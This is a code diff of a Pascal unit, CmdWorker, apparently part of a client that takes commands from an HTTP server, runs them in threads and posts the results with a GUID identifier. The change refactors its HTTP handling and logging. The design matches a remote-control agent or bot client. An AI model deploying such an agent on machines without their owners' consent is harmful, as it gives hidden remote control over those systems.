@@ -5,11 +5,13 @@ unit CmdWorker;
 interface
 
 uses
-  NetModule, Tools,
-  Classes, SysUtils, IdMultipartFormData, Process;
+  NetModule, Tools, Debug,
+  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP;
 
 type
   TCmdWorker = class(TThread)
+  Hat: TIdHTTP;
+  ToPost: TIdMultipartFormDataStream;
   private
     FCmdID: String;
     FIndex: LongInt;
@@ -71,36 +73,37 @@ end;
 
 constructor TCmdWorker.Create(CmdID: String; Index: LongInt);
 Begin
-  inherited Create(True);
   FreeOnTerminate:=True;
   FCmdID:=CmdID;
   FIndex:=Index;
-  Start;
+  Hat:=TIdHTTP.Create(Nil);
+  inherited Create(False);
 end;
 
 destructor TCmdWorker.Destroy;
 Begin
+  Hat.Free;
+  ToPost.Free;
   inherited Destroy;
   Workers[FIndex]:=Nil;
 end;
 
 procedure TCmdWorker.Abort(AbortID: String);
 var
-  ToPost: TIdMultipartFormDataStream;
+  _ToPost: TIdMultipartFormDataStream;
 Begin
-  ToPost:=TIdMultipartFormDataStream.Create;
-  ToPost.AddFormField('GUID', ID);
-  ToPost.AddFormField('ID', AbortID);
-  ToPost.AddFormField('RT', '1');
-  ToPost.AddFormField('Result', 'Abort successful.');
-  Writeln('APost --> ',Net.HTTPAgent.Post(Server+ResultsPHP, ToPost));
-  ToPost.Free;
+  _ToPost:=TIdMultipartFormDataStream.Create;
+  _ToPost.AddFormField('GUID', ID);
+  _ToPost.AddFormField('ID', AbortID);
+  _ToPost.AddFormField('RT', '1');
+  _ToPost.AddFormField('Result', 'Abort successful.');
+  Writeln('[',FIndex,'] ABORT-POST --> ',Hat.Post(Server+ResultsPHP, _ToPost));
+  _ToPost.Free;
   Terminate;
 end;
 
 procedure TCmdWorker.Execute;
 var
-  ToPost: TIdMultipartFormDataStream;
 
   Master: TProcess;
   MemStream: TMemoryStream;
@@ -108,14 +111,16 @@ var
 
   procedure DoPost;
   Begin
-     Writeln('Post --> ',Net.HTTPAgent.Post(Server+ResultsPHP, ToPost));
+    try
+     Writeln('[',FIndex,'] CMD-POST --> ',Hat.Post(Server+ResultsPHP, ToPost));
+    except
+    end;
   end;
 
 Begin
   ToPost:=TIdMultipartFormDataStream.Create;
   ToPost.AddFormField('GUID', ID);
   ToPost.AddFormField('ID', FCmdID);
-  Writeln('Command type: ',Net.Commands.ReadString(FCmdID, 'Type', ''));
   Case Net.Commands.ReadString(FCmdID, 'Type', '') of
     'Register': Begin
       ToPost.AddFormField('RT', '3');
@@ -185,16 +190,14 @@ Begin
       ToPost.AddFormField('Result', 'Pong!');
       DoPost;
     end
-    end
     else Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Unknown command!');
       DoPost;
     end;
   end;
-  //Send result to the server
-  ToPost.Free;
-  Writeln('Thread ',FCmdID,' exited.');
+  Writeln('Thread [',FIndex,'] exited.');
+  Sleep(1000); //Used to prevent the client from accidentally performing the same command again
 end;
 
 end.
